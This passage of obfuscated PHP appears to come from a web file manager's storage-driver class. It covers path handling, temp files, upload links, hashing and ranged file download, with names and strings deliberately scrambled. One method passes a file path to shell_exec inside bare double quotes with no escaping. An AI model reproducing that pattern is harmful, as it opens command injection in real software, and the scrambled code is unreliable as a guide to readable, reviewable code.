$bå˜êµ[67] . $BØáÇç•ƒ¹; if (isset($aÜÌãùæ±[$Bë±¸· Õ‰])) { return $aÜÌãùæ±[$Bë±¸· Õ‰]; } if (function_exists($bå˜êµ[68])) { $bŒÄÎîöî = @mb_convert_encoding($BØáÇç•ƒ¹, $d±ä²ÔŠÈš, $C‹ßˆœ…); } else { $bŒÄÎîöî = @iconv($C‹ßˆœ…, $d±ä²ÔŠÈš, $BØáÇç•ƒ¹); } goto Cé¯èÃãšæ; bÊ³È—â‰: return $bŒÄÎîöî; goto fÅâŠçÚé; BÎ¼ª›Š¢ï: $aÜÌãùæ±[$d±ä²ÔŠÈš . $bå˜êµ[66] . $C‹ßˆœ… . $bå˜êµ[67] . $BØáÇç•ƒ¹] = $BØáÇç•ƒ¹; $aÜÌãùæ±[$d±ä²ÔŠÈš . $bå˜êµ[66] . $C‹ßˆœ… . $bå˜êµ[67] . $bŒÄÎîöî] = $BØáÇç•ƒ¹; $aÜÌãùæ±[$C‹ßˆœ… . $bå˜êµ[66] . $d±ä²ÔŠÈš . $bå˜êµ[67] . $bŒÄÎîöî] = $bŒÄÎîöî; goto bÊ³È—â‰; fÔÇ—Š¥: $bå˜êµ =& $_SERVER[¯Ò¬Èè]; if (!$BØáÇç•ƒ¹ || !function_exists($bå˜êµ[65])) { return $BØáÇç•ƒ¹; } static $aÜÌãùæ± = array(); goto f‹¿Ü¥íçÇ; Cé¯èÃãšæ: $bŒÄÎîöî = $bŒÄÎîöî ? $bŒÄÎîöî : $BØáÇç•ƒ¹; if (strstr($bŒÄÎîöî, $bå˜êµ[69])) { $bŒÄÎîöî = str_replace($bå˜êµ[69], $bå˜êµ[70], $bŒÄÎîöî); } $aÜÌãùæ±[$C‹ßˆœ… . $bå˜êµ[66] . $d±ä²ÔŠÈš . $bå˜êµ[67] . $BØáÇç•ƒ¹] = $bŒÄÎîöî; goto BÎ¼ª›Š¢ï; fÅâŠçÚé: } public function getPathInner($bö òáÕ‡Ğ) { $fàÓÎÉÂÈ = IO::init($bö òáÕ‡Ğ); return $fàÓÎÉÂÈ->path; } public function getPathOuter($bÜø£ÛÓ–Œ) { $cïñÁ›×é =& $_SERVER[¯Ò¬Èè]; $cœ ²Šµ  = strlen(trim($this->pathBase, $cïñÁ›×é[8])); $bÜø£ÛÓ–Œ = substr(trim($bÜø£ÛÓ–Œ, $cïñÁ›×é[8]), $cœ ²Šµ ); return $this->pathDriver . $cïñÁ›×é[8] . ltrim($bÜø£ÛÓ–Œ, $cïñÁ›×é[8]); } public function isParentOf($a “®¾…•×, $FÆ½¯ƒòöà) { $Bà¦Ì¯Ù¬Å =& $_SERVER[¯Ò¬Èè]; $a “®¾…•× = rtrim(strtolower($a “®¾…•×), $Bà¦Ì¯Ù¬Å[8]) . $Bà¦Ì¯Ù¬Å[8]; $FÆ½¯ƒòöà = rtrim(strtolower($FÆ½¯ƒòöà), $Bà¦Ì¯Ù¬Å[8]) . $Bà¦Ì¯Ù¬Å[8]; $DİŞÊ’¿¤ = strpos($FÆ½¯ƒòöà, $a “®¾…•×) === 0; return $DİŞÊ’¿¤; } public function getType() { $bŒ”Ù´×¢ =& $_SERVER[¯Ò¬Èè]; $bÂÎÖ™°­ = str_replace($bŒ”Ù´×¢[71], $bŒ”Ù´×¢[33], get_class($this)); return strtolower($bÂÎÖ™°­); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($fäÇÆ·¤Í, $eõÈÇ Í¥) { $fÛÈÜ¢Õ¡¡ =& $_SERVER[¯Ò¬Èè]; $F»ÏÎ”Ã‰ö = rtrim($fäÇÆ·¤Í, $fÛÈÜ¢Õ¡¡[8]) . $fÛÈÜ¢Õ¡¡[8] . $eõÈÇ Í¥; $Cù¡‡±Ã‹ = $this->exist($F»ÏÎ”Ã‰ö); return $Cù¡‡±Ã‹ ? $F»ÏÎ”Ã‰ö : !1; } public function renameObject($cÙñÃÕ‹ÂÌ, $BÜ©İ©†•’) { goto c¸³¹”Š¦; dß©…“Ùá: $cÙñÃÕ‹ÂÌ = $this->getPathOuter($cÙñÃÕ‹ÂÌ); $BÜ©İ©†•’ = $this->pathFather($cÙñÃÕ‹ÂÌ) . $BÜ©İ©†•’; if (IO::isFile($cÙñÃÕ‹ÂÌ)) { $BäŒÑ™’šË = IO::copy($cÙñÃÕ‹ÂÌ, $this->pathFather($cÙñÃÕ‹ÂÌ), REPEAT_RENAME_FOLDER, $d¼£ñšÚÜñ); if ($BäŒÑ™’šË) { IO::remove($cÙñÃÕ‹ÂÌ); } } else { $BäŒÑ™’šË = IO::mkdir($BÜ©İ©†•’); if (!$BäŒÑ™’šË) { return !1; } $e¢ª¼±æ—Ô = IO::listPath($cÙñÃÕ‹ÂÌ, !0); $c‰Å¤…ƒÊ = array_merge($e¢ª¼±æ—Ô[$Fíˆ–İïª–[73]], $e¢ª¼±æ—Ô[$Fíˆ–İïª–[74]]); foreach ($c‰Å¤…ƒÊ as $FÒö¹èŠš) { IO::move($FÒö¹èŠš[$Fíˆ–İïª–[75]], $BÜ©İ©†•’, REPEAT_RENAME_FOLDER); } IO::remove($cÙñÃÕ‹ÂÌ); } goto Bµ‚¦ñæ†×; c¸³¹”Š¦: $Fíˆ–İïª– =& $_SERVER[¯Ò¬Èè]; $d¼£ñšÚÜñ = $BÜ©İ©†•’; Hook::trigger($Fíˆ–İïª–[72], $this, $cÙñÃÕ‹ÂÌ, $this, $this->pathFather($cÙñÃÕ‹ÂÌ) . $BÜ©İ©†•’); goto dß©…“Ùá; Bµ‚¦ñæ†×: return $BäŒÑ™’šË ? $BÜ©İ©†•’ : !1; goto C‡Öâ°ïÄ; C‡Öâ°ïÄ: } public function tempFile($AùÇ‚¥÷™· = '', $fÍøØíòå© = '') { goto a•Õ›ˆÂ”«; E„•‡Ü‹°Í: return $fìøÏÏÎ µ; goto b°•Îôˆ£; f¹§äøß½š: $fìøÏÏÎ µ = $f†ÇƒÌÊæÉ . $AùÇ‚¥÷™·; @touch($fìøÏÏÎ µ); if ($fÍøØíòå©) { file_put_contents($fìøÏÏÎ µ, $fÍøØíòå©); } goto E„•‡Ü‹°Í; a•Õ›ˆÂ”«: if (!$AùÇ‚¥÷™·) { $AùÇ‚¥÷™· = rand_string(15); } $f†ÇƒÌÊæÉ = TEMP_FILES . rand_string(15) . $_SERVER[¯Ò¬Èè][8]; @mkdir($f†ÇƒÌÊæÉ, 511, !0); goto f¹§äøß½š; b°•Îôˆ£: } public function tempFileRemve($E¼¬×ÙÑ­§) { @unlink($E¼¬×ÙÑ­§); @rmdir($this->pathFather($E¼¬×ÙÑ­§)); } public function mkfile($cª…‹Ğğí, $c®‘½“ÇÄµ = '', $F²¾íá„¹Ø = REPEAT_RENAME) { } public function mkdir($bÇĞÖğ“¢¾, $F…ÒïÓÃÇ = REPEAT_SKIP) { } public function delFile($BÛÏ¹ßË÷É) { } public function delFolder($bËİ…¦Éóî) { } public function copyFile($C÷‰’¦¨è´, $Bˆ«º¤ÌÂÉ) { } public function moveFile($Fß¹ÖŒêÆ, $DØòÅŠÀâì) { } public function remove($D„´‚ò·‰«) { if ($this->isFile($D„´‚ò·‰«)) { return $this->delFile($D„´‚ò·‰«); } return $this->delFolder($D„´‚ò·‰«); } public function rename($d«œÂá»¹, $C§Ó£¦¨ã›) { } public function exist($e¤ëˆ Ìá«) { } public function findByHash($B¶œ—ø½ïö = '', $Fİš¡íŒÌë = '') { return !1; } public function isFile($eËŸíÓ°Ó) { } public function isFolder($A¥ŠÚÙ²´) { } public function size($f­ò…·Üœ÷) { } public function info($B×Â„·ˆÈä) { } public function infoSimple($d‹Î¾Î²‰‹) { return $this->info($d‹Î¾Î²‰‹); } public function infoAuth($c†œ©ğ½éÀ) { return $this->info($c†œ©ğ½éÀ); } public function infoFull($f…‘ùÀîø) { return $this->info($f…‘ùÀîø); } public function infoWithChildren($aÜº†¥­Œ) { $FÚƒÆğˆ½Ù =& $_SERVER[¯Ò¬Èè]; static $E¸Ç‰ÅŞÀĞ = array(); if (isset($E¸Ç‰ÅŞÀĞ[$aÜº†¥­Œ])) { return $E¸Ç‰ÅŞÀĞ[$aÜº†¥­Œ]; } $aŒó°ğù® = $this->info($aÜº†¥­Œ); if ($aŒó°ğù® && $aŒó°ğù®[$FÚƒÆğˆ½Ù[29]] == $FÚƒÆğˆ½Ù[76]) { $A ¯ã„òšª = array($FÚƒÆğˆ½Ù[77] => 0, $FÚƒÆğˆ½Ù[78] => 0, $FÚƒÆğˆ½Ù[79] => 0); $this->infoChildren($aÜº†¥­Œ, $A ¯ã„òšª); $aŒó°ğù®[$FÚƒÆğˆ½Ù[77]] = $A ¯ã„òšª[$FÚƒÆğˆ½Ù[77]]; $aŒó°ğù®[$FÚƒÆğˆ½Ù[80]] = array($FÚƒÆğˆ½Ù[81] => $A ¯ã„òšª[$FÚƒÆğˆ½Ù[78]], $FÚƒÆğˆ½Ù[82] => $A ¯ã„òšª[$FÚƒÆğˆ½Ù[79]]); $E¸Ç‰ÅŞÀĞ[$aÜº†¥­Œ] = $aŒó°ğù®; } return $aŒó°ğù®; } public function listPath($AÃö¦ó©¤Í, $D¦¾Èò½½ = false) { } public function has($Aöáœª˜Æ , $bá˜ºµ°”• = false, $CÒ¨œ¿ñÇ• = false) { } public function canRead($a‰–÷£¥ ) { } public function canWrite($añ¦ª„¦÷) { } public function getContent($EÜ¼Î£í†) { } public function setContent($A×ÚùìĞŠ, $cÆã¢•‘ô = '') { } protected function infoChildren($f›œ†ùì¼µ, &$d’Æâ™†ó) { $eˆ ‰ƒ­÷ô =& $_SERVER[¯Ò¬Èè]; check_abort(); $B¹ïù¸š— = $this->listPath($f›œ†ùì¼µ, !0); $B¹ïù¸š— = array_merge($B¹ïù¸š—[$eˆ ‰ƒ­÷ô[74]], $B¹ïù¸š—[$eˆ ‰ƒ­÷ô[73]]); foreach ($B¹ïù¸š— as $AÇæ”‰Àä¬) { if ($AÇæ”‰Àä¬[$eˆ ‰ƒ­÷ô[29]] == $eˆ ‰ƒ­÷ô[76]) { $d’Æâ™†ó[$eˆ ‰ƒ­÷ô[79]]++; $cÚËì®çŠ = $this->getPathInner($AÇæ”‰Àä¬[$eˆ ‰ƒ­÷ô[75]]); $this->infoChildren($cÚËì®çŠ, $d’Æâ™†ó); } else { $d’Æâ™†ó[$eˆ ‰ƒ­÷ô[78]]++; $d’Æâ™†ó[$eˆ ‰ƒ­÷ô[77]] += $AÇæ”‰Àä¬[$eˆ ‰ƒ­÷ô[77]]; } } } public function fileSubstr($BÓ‰èÉ¤Úä, $f’êíàØí, $CÎ™ŸÍÏ—Õ) { } public function listAll($eÆã£ö±…Ò) { } public function upload($dáÉÇË„Å, $cÏ¹Ó„ì±Ô, $a¢ìÕùÇØÛ = false, $E÷¼ùšµ• = REPEAT_REPLACE) { } public function uploadFileByID($dµˆÖÍÇ¹Ñ, $eİ¾¹š“‰İ, $døä»ªÛÔ’) { } public function uploadFileByPath($Eß´ÂÕŞî­, $cà¦¼ßö¥ò, $dÔ½ù±ÙóÉ = array()) { } public function isUploadServer() { $a¬‘ƒ©¦„¨ =& $_SERVER[¯Ò¬Èè]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $a¬‘ƒ©¦„¨[83]) { return !0; } return $GLOBALS[$a¬‘ƒ©¦„¨[6]][$a¬‘ƒ©¦„¨[84]][$a¬‘ƒ©¦„¨[85]]; } public function isFileOutServer() { $C± †ö’šØ =& $_SERVER[¯Ò¬Èè]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $C± †ö’šØ[83]) { return !0; } return $GLOBALS[$C± †ö’šØ[6]][$C± †ö’šØ[84]][$C± †ö’šØ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($A¨î­ÎìÎ‘) { $aé¾Õ¦É =& $_SERVER[¯Ò¬Èè]; if (!$this->isCdnHost()) { return $A¨î­ÎìÎ‘; } return str_replace(trim(get_url_root($A¨î­ÎìÎ‘), $aé¾Õ¦É[8]), trim($this->cdnHost, $aé¾Õ¦É[8]), $A¨î­ÎìÎ‘); } public function uploadLink($eİôé¼Ö–, $fé‚›Íæ‰… = 0) { goto e¦ÅÜ¤‹å; F¸Äªòó½Ö: $B‘±áßğ¼± = $fé‚›Íæ‰… <= $e‡®»”É¹ ? $e§¿Ÿ¼·Ÿ‘[87] : $e§¿Ÿ¼·Ÿ‘[88]; $FÕææöÄ‘ª = (!$fé‚›Íæ‰… ? 1 : ceil($fé‚›Íæ‰… / pow(1024, 3))) * 3600 * 4; $BÊ‡é¡¯ƒÍ = $this->{$B‘±áßğ¼±}($eİôé¼Ö–, $FÕææöÄ‘ª); goto e—ïå¢É—‚; e¦ÅÜ¤‹å: $e§¿Ÿ¼·Ÿ‘ =& $_SERVER[¯Ò¬Èè]; if ($this->isUploadServer()) { return; } $bŠÄŞ¯ˆ‚ = $this->getType(); goto d…–²èª½; e—ïå¢É—‚: if ($BÊ‡é¡¯ƒÍ) { $BÊ‡é¡¯ƒÍ[$e§¿Ÿ¼·Ÿ‘[89]] = $eİôé¼Ö–; $BÊ‡é¡¯ƒÍ[$e§¿Ÿ¼·Ÿ‘[90]] = $bŠÄŞ¯ˆ‚; } return $BÊ‡é¡¯ƒÍ; goto Dˆ‚³ÚÂ‰; d…–²èª½: if (!in_array($bŠÄŞ¯ˆ‚, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $e‡®»”É¹ = 1024 * 1024 * 10; goto F¸Äªòó½Ö; Dˆ‚³ÚÂ‰: } public function uploadFormData($B•ŞòàÕÜ , $dŞíƒ„Î§ = 3600) { } public function multiUploadFormData($D·‚ö©©çÉ, $C¿„ˆ˜×¦İ = 3600) { } public function download($DÌÉÇ¤Ÿ, $aê‹Å©å¯) { } public function ext($dÁç§‹ê”î) { $E²£×ÕÍŠ =& $_SERVER[¯Ò¬Èè]; if (strpos($dÁç§‹ê”î, $E²£×ÕÍŠ[8]) === -1) { $Eµ”‚ƒªô = $dÁç§‹ê”î; } else { $Eµ”‚ƒªô = $this->pathThis($dÁç§‹ê”î); } $cÉ°ßËê = $E²£×ÕÍŠ[33]; if (strstr($Eµ”‚ƒªô, $E²£×ÕÍŠ[91])) { $cÉ°ßËê = substr($Eµ”‚ƒªô, strrpos($Eµ”‚ƒªô, $E²£×ÕÍŠ[91]) + 1); $cÉ°ßËê = strtolower($cÉ°ßËê); } if (strlen($cÉ°ßËê) > 3 && preg_match($E²£×ÕÍŠ[92], $cÉ°ßËê, $e˜ñ ßÕíî)) { $cÉ°ßËê = $E²£×ÕÍŠ[33]; } return $cÉ°ßËê; } public function pathThis($fÖ’ÖôÑÍº) { $e½ªÍàœÙÖ =& $_SERVER[¯Ò¬Èè]; $fÖ’ÖôÑÍº = str_replace($e½ªÍàœÙÖ[93], $e½ªÍàœÙÖ[8], rtrim($fÖ’ÖôÑÍº, $e½ªÍàœÙÖ[8])); $f¾ÊŒï¹¬ƒ = strrpos($fÖ’ÖôÑÍº, $e½ªÍàœÙÖ[8]); if ($f¾ÊŒï¹¬ƒ === !1) { return $fÖ’ÖôÑÍº; } return substr($fÖ’ÖôÑÍº, $f¾ÊŒï¹¬ƒ + 1); } public function pathFather($eÆ¡Ÿ÷¹Õ…) { $Bœ™Å¸Ç”ç =& $_SERVER[¯Ò¬Èè]; $eÆ¡Ÿ÷¹Õ… = str_replace($Bœ™Å¸Ç”ç[93], $Bœ™Å¸Ç”ç[8], rtrim($eÆ¡Ÿ÷¹Õ…, $Bœ™Å¸Ç”ç[8])); $b‰º¿„éõ = strrpos($eÆ¡Ÿ÷¹Õ…, $Bœ™Å¸Ç”ç[8]); if ($b‰º¿„éõ === !1) { return $Bœ™Å¸Ç”ç[33]; } return substr($eÆ¡Ÿ÷¹Õ…, 0, $b‰º¿„éõ + 1); } public function hashSimple($a¬îòÏØ¯) { goto AØ¬ïÛ³ìŠ; F°Õ‚š—İ: $f×Œ„³ñ¥œ = intval($dëÁî“¸˜é / $dÊØ½åï¢—); $A¼Í­òê¾Ü = $Cé§¢é•Œö[33]; for ($f¹îá’É¨Ë = 0; $f¹îá’É¨Ë < $dÊØ½åï¢—; $f¹îá’É¨Ë++) { $A¼Í­òê¾Ü .= $this->fileSubstr($a¬îòÏØ¯, $f×Œ„³ñ¥œ * $f¹îá’É¨Ë, $cíÑç¤ù); } goto DğÛÂ‡Û¤±; DğÛÂ‡Û¤±: $A¼Í­òê¾Ü .= $this->fileSubstr($a¬îòÏØ¯, $dëÁî“¸˜é - $cíÑç¤ù, $cíÑç¤ù); return md5($A¼Í­òê¾Ü) . $dëÁî“¸˜é; goto f±õ¾çì´°; AØ¬ïÛ³ìŠ: $Cé§¢é•Œö =& $_SERVER[¯Ò¬Èè]; if (!$a¬îòÏØ¯) { return md5($Cé§¢é•Œö[33]); } $dëÁî“¸˜é = $this->size($a¬îòÏØ¯); goto DØŒÅöæ“; DØŒÅöæ“: $cíÑç¤ù = 200; $dÊØ½åï¢— = 50; if ($dëÁî“¸˜é <= $cíÑç¤ù * $dÊØ½åï¢—) { return $this->hashMd5($a¬îòÏØ¯) . $dëÁî“¸˜é; } goto F°Õ‚š—İ; f±õ¾çì´°: } public static $md5Cache = array(); public function hashMd5($bÌ¸é† ˜) { $bÌ¸é† ˜ = $this->iconvSystem($bÌ¸é† ˜); if (isset(self::$md5Cache[$bÌ¸é† ˜])) { return self::$md5Cache[$bÌ¸é† ˜]; } self::$md5Cache[$bÌ¸é† ˜] = $this->hashMd5Shell($bÌ¸é† ˜); if (!self::$md5Cache[$bÌ¸é† ˜]) { self::$md5Cache[$bÌ¸é† ˜] = @md5_file($bÌ¸é† ˜); } return self::$md5Cache[$bÌ¸é† ˜]; } private function hashMd5Shell($céïÊ•½) { goto AŠñ‚Çò‘â; dÛÙÎ¢¸âí: $Bí±­¦ë³Ş = Cache::get($AÉÎ¶ƒõ‘³[97]); if (!$Bí±­¦ë³Ş) { $bôÏ²Ñ¹³Ä = BASIC_PATH . $AÉÎ¶ƒõ‘³[98]; $b¬Ñ©ïÄè = md5_file($bôÏ²Ñ¹³Ä); $Bí±­¦ë³Ş = $AÉÎ¶ƒõ‘³[99]; foreach ($d¬ê¥šÌ as $FËÅ¨ÀßÎë) { $DÅ§†…á¿Ğ = shell_exec($FËÅ¨ÀßÎë . "\40\42{$bôÏ²Ñ¹³Ä}\42"); if ($DÅ§†…á¿Ğ && substr(trim($DÅ§†…á¿Ğ), 0, 32) == $b¬Ñ©ïÄè) { $Bí±­¦ë³Ş = $FËÅ¨ÀßÎë; break; } } Cache::set($AÉÎ¶ƒõ‘³[97], $Bí±­¦ë³Ş, 3600); } if ($Bí±­¦ë³Ş == $AÉÎ¶ƒõ‘³[99]) { return !1; } goto e‡˜Õ…ì÷”; e‡˜Õ…ì÷”: $DÅ§†…á¿Ğ = shell_exec($Bí±­¦ë³Ş . "\40\42{$céïÊ•½}\42"); $DÅ§†…á¿Ğ = str_replace($AÉÎ¶ƒõ‘³[100], $AÉÎ¶ƒõ‘³[33], $DÅ§†…á¿Ğ); return substr($DÅ§†…á¿Ğ, 0, 32); goto CšŸàŞÂÓ; AŠñ‚Çò‘â: $AÉÎ¶ƒõ‘³ =& $_SERVER[¯Ò¬Èè]; if (!function_exists($AÉÎ¶ƒõ‘³[94])) { return !1; } $d¬ê¥šÌ = array($AÉÎ¶ƒõ‘³[95], $AÉÎ¶ƒõ‘³[96]); goto dÛÙÎ¢¸âí; CšŸàŞÂÓ: } public function link($aòóÅ­®çæ) { return $aòóÅ­®çæ; } public function fileOut($b…µ¨í‡, $aÍÎ÷ßóè¥ = false, $FñÏò»ù¿Ì = false, $Cõƒ«©¹µİ = '') { goto b ÅÏÃ¤ë; dİ›¨á¼™î: $bâ‰›ˆ¦Èø = rawurlencode($dŸò„ÅŒ°î); $bâ‰›ˆ¦Èø = $c©«ËÊ[113] . $bâ‰›ˆ¦Èø . $c©«ËÊ[117] . $bâ‰›ˆ¦Èø; if ($aÍÎ÷ßóè¥) { header($c©«ËÊ[118]); header($c©«ËÊ[119] . $bâ‰›ˆ¦Èø); } else { header($c©«ËÊ[120] . $bâ‰›ˆ¦Èø); } goto DÌ‘„ôå¼‰; b ÅÏÃ¤ë: $c©«ËÊ =& $_SERVER[¯Ò¬Èè]; $this->cacheMethod(null, null); if (!$b…µ¨í‡ || !$this->exist($b…µ¨í‡)) { show_json(LNG($c©«ËÊ[101]), !1, $FñÏò»ù¿Ì); } goto B„ëÎæĞŠ‘; D¤ß¶°äö: header($c©«ËÊ[125]); header($c©«ËÊ[126]); header($c©«ËÊ[127]); goto FîÄ‰¿Ü¥; EùùÜË‘ª•: @ob_end_clean(); set_timeout(); $CøˆÉËŸ’ó = $this->infoFull($b…µ¨í‡); goto CŸÁßÏ‹ö; DÌ‘„ôå¼‰: header($c©«ËÊ[121]); header($c©«ËÊ[122] . $C¯‚³¼Õ‰Ñ); header($c©«ËÊ[123] . gmdate($c©«ËÊ[106], time() + 3600 * 24 * 30) . $c©«ËÊ[124]); goto D¤ß¶°äö; F²›¬òÙâ‹: header($c©«ËÊ[135] . $F¶‹Ú‰¼ºÏ); header($c©«ËÊ[136]); if (!$aÍÎ÷ßóè¥ && $c™Œ‡Ü›ƒ´ == $c©«ËÊ[137]) { if ($F¶‹Ú‰¼ºÏ > 1024 * 1024 * 5) { die; } $fÇÂ›™‡Œ¡ = $this->getContent($b…µ¨í‡); $fÇÂ›™‡Œ¡ = Html::clearSVG($fÇÂ›™‡Œ¡); header($c©«ËÊ[138] . $F¶‹Ú‰¼ºÏ); echo $fÇÂ›™‡Œ¡; die; } goto CÎØ½íÓŒò; a²ºÅÅê¾: if ($FÑ„ »æ‹‹) { $aµÙìÊ‡ÅÃ = intval(1000 * 1000 * ($bì·ÆÍ„Å / $FÑ„ »æ‹‹)); } while ($aõĞ´Ì§Ã <= $dŠ˜‚Ÿ†‚ï) { $b§ì¨ä’‘Å = timeFloat(); check_abort(); $eàˆ¹Îˆ  = $dŠ˜‚Ÿ†‚ï - $aõĞ´Ì§Ã + 1; if ($eàˆ¹Îˆ  <= $bì·ÆÍ„Å) { $bì·ÆÍ„Å = $eàˆ¹Îˆ ; } echo $this->fileSubstr($b…µ¨í‡, $aõĞ´Ì§Ã, $bì·ÆÍ„Å); $aõĞ´Ì§Ã += $bì·ÆÍ„Å; if ($bì·ÆÍ„Å == $eàˆ¹Îˆ ) { $aõĞ´Ì§Ã = $dŠ˜‚Ÿ†‚ï + 1; } if ($aµÙìÊ‡ÅÃ) { $AÔø¿«»ìõ = intval(1000 * 1000 * (timeFloat() - $b§ì¨ä’‘Å)); $aÀä¶Ø…â… = $aµÙìÊ‡ÅÃ - $AÔø¿«»ìõ; if ($aÀä¶Ø…â… > 5) { usleep($aÀä¶Ø…â…); } } } goto cá×›Ü°¨; CŸÁßÏ‹ö: $F¶‹Ú‰¼ºÏ = $CøˆÉËŸ’ó[$c©«ËÊ[77]]; $A‚ìÚ‰¼‰¢ = gmdate($c©«ËÊ[106], $CøˆÉËŸ’ó[$c©«ËÊ[107]]); $dŸò„ÅŒ°î = $FñÏò»ù¿Ì ? $FñÏò»ù¿Ì : $this->iconvApp($CøˆÉËŸ’ó[$c©«ËÊ[28]]); goto d·Ì÷´½¨‚; fÁèÃÃ‰ÏĞ: if (in_array($c™Œ‡Ü›ƒ´, array($c©«ËÊ[108], $c©«ËÊ[109], $c©«ËÊ[110], $c©«ËÊ[111]))) { $c™Œ‡Ü›ƒ´ = $c©«ËÊ[112]; } if (!$Cõƒ«©¹µİ) { $Cõƒ«©¹µİ = md5($A‚ìÚ‰¼‰¢ . $this->hashSimple($b…µ¨í‡)); } $Cõƒ«©¹µİ = $c©«ËÊ[113] . $Cõƒ«©¹µİ . $c©«ËÊ[113]; goto EèƒóïÙÆ¼; fï®¯âŠòŒ: $DÒÏªÑÈõõ = !0; if ($_SERVER[$c©«ËÊ[151]] == $c©«ËÊ[152] && $F¶‹Ú‰¼ºÏ > 1204 * 1024 * 1024 * 2) { $DÒÏªÑÈõõ = !1; } if ($DÒÏªÑÈõõ) { header($c©«ËÊ[153] . ($dŠ˜‚Ÿ†‚ï - $aõĞ´Ì§Ã + 1)); } goto f¾¡Åä‚Æø; EèƒóïÙÆ¼: $C¯‚³¼Õ‰Ñ = get_file_mime($c™Œ‡Ü›ƒ´); if (strstr($C¯‚³¼Õ‰Ñ, $c©«ËÊ[114])) { $C¯‚³¼Õ‰Ñ = $C¯‚³¼Õ‰Ñ . $c©«ËÊ[115]; } if ($aÍÎ÷ßóè¥ === !1 && !mime_support($C¯‚³¼Õ‰Ñ)) { $aÍÎ÷ßóè¥ = !0; $C¯‚³¼Õ‰Ñ = $c©«ËÊ[116]; } goto dİ›¨á¼™î; FîÄ‰¿Ü¥: if (isset($_SERVER[$c©«ËÊ[128]]) && strtotime($_SERVER[$c©«ËÊ[128]]) == $CøˆÉËŸ’ó[$c©«ËÊ[107]]) { header($c©«ËÊ[129], !0, 304); die; } if (isset($_SERVER[$c©«ËÊ[130]]) && $_SERVER[$c©«ËÊ[130]] == $Cõƒ«©¹µİ) { header($c©«ËÊ[131] . $Cõƒ«©¹µİ, !0, 304); die; } header($c©«ËÊ[131] . $Cõƒ«©¹µİ); goto f’Ç»§Ñ; B„ëÎæĞŠ‘: $eí£Ö·¿Õ® = $this->getType() == $c©«ËÊ[102]; $e«Æ‡©„”§ = $GLOBALS[$c©«ËÊ[6]][$c©«ËÊ[84]][$c©«ËÊ[103]][$c©«ËÊ[104]]; $FÑ„ »æ‹‹ = (double) $GLOBALS[$c©«ËÊ[6]][$c©«ËÊ[84]][$c©«ËÊ[103]][$c©«ËÊ[105]] * 1024 * 1024; goto EùùÜË‘ª•; f¾¡Åä‚Æø: if ($_SERVER[$c©«ËÊ[154]] == $c©«ËÊ[155]) { return; } $bì·ÆÍ„Å = 1024 * 100; $aµÙìÊ‡ÅÃ = 0; goto a²ºÅÅê¾; d·Ì÷´½¨‚: $aõĞ´Ì§Ã = 0; $dŠ˜‚Ÿ†‚ï = $F¶‹Ú‰¼ºÏ - 1; $c™Œ‡Ü›ƒ´ = $this->ext($dŸò„ÅŒ°î); goto fÁèÃÃ‰ÏĞ; f’Ç»§Ñ: header($c©«ËÊ[132] . $A‚ìÚ‰¼‰¢ . $c©«ËÊ[124]); header($c©«ËÊ[133] . $dŸò„ÅŒ°î); header($c©«ËÊ[134]); goto F²›¬òÙâ‹; CÎØ½íÓŒò: $aí…‘ø¶ì¥ = strtolower($_SERVER[$c©«ËÊ[139]]); if ($eí£Ö·¿Õ® && $aí…‘ø¶ì¥ && $e«Æ‡©„”§) { if (strstr($aí…‘ø¶ì¥, $c©«ËÊ[140])) { header($c©«ËÊ[141] . $b…µ¨í‡); } else { if (strstr($aí…‘ø¶ì¥, $c©«ËÊ[142])) { header($c©«ËÊ[143] . $b…µ¨í‡); } else { if (strstr($aí…‘ø¶ì¥, $c©«ËÊ[144])) { header($c©«ËÊ[145] . $b…µ¨í‡); } } } if ($FÑ„ »æ‹‹) { header($c©«ËÊ[146] . $FÑ„ »æ‹‹); } return; } if (isset($_SERVER[$c©«ËÊ[147]])) { if (preg_match($c©«ËÊ[148], $_SERVER[$c©«ËÊ[147]], $D¹ê¹‹À×ö)) { $aõĞ´Ì§Ã = intval($D¹ê¹‹À×ö[1]); if (!empty($D¹ê¹‹À×ö[2])) { $dŠ˜‚Ÿ†‚ï = intval($D¹ê¹‹À×ö[2]); } } header($c©«ËÊ[149]); header("\103\x6f\156\164\145\156\x74\55\122\141\x6e\147\145\72\x20\142\171\164\x65\163\x20{$aõĞ´Ì§Ã}\55{$dŠ˜‚Ÿ†‚ï}\x2f" . $F¶‹Ú‰¼ºÏ); } else { header($c©«ËÊ[150]); } goto fï®¯âŠòŒ; cá×›Ü°¨: } public function fileOutServer($E‰Š¸Í¡ŸÙ, $c¨íÔ¸™Ñ” = false, $D¦Èç¦¾ƒÅ = false, $f¥óœ¯ª„Ú = '') { $this->fileOut($E‰Š¸Í¡ŸÙ, $c¨íÔ¸™Ñ”, $D¦Èç¦¾ƒÅ, $f¥óœ¯ª„Ú); } public function fileOutLink($A«Óºó–÷») { header($_SERVER[¯Ò¬Èè][156] . $A«Óºó–÷»); die; } public function cacheMethod($d—ÖåÄ­», $a¡ïŸ–†ó÷) { goto bª³á†à¨ƒ; dŞ ö‹‹È¹: $d’™èÔŠ®ó[$B™àïÙ±¯Î] = $E„‡°ÓØô; return $E„‡°ÓØô; goto B»‡×†‡¦¼; bª³á†à¨ƒ: $D‰¾÷¾Ñ­ =& $_SERVER[¯Ò¬Èè]; static $d’™èÔŠ®ó = array(); $a½å±Ò‚‹ = $a¡ïŸ–†ó÷ ? ltrim($this->getPathOuter($a¡ïŸ–†ó÷), $D‰¾÷¾Ñ­[8]) : $a¡ïŸ–†ó÷; goto e¥íÒè²‰ä; e¥íÒè²‰ä: $B™àïÙ±¯Î = $D‰¾÷¾Ñ­[157] . $d—ÖåÄ­» . $D‰¾÷¾Ñ­[158] . rtrim($a½å±Ò‚‹, $D‰¾÷¾Ñ­[8]); if (is_null($d—ÖåÄ­»)) { $d’™èÔŠ®ó = array(); return; } if (is_null($a¡ïŸ–†ó÷)) { unset($d’™èÔŠ®ó[$B™àïÙ±¯Î]); return; } goto b¢¥°«Ê¤Æ; b¢¥°«Ê¤Æ: $E„‡°ÓØô = isset($d’™èÔŠ®ó[$B™àïÙ±¯Î]) ? $d’™èÔŠ®ó[$B™àïÙ±¯Î] : null; if (!is_null($E„‡°ÓØô)) { return $E„‡°ÓØô; } $E„‡°ÓØô = 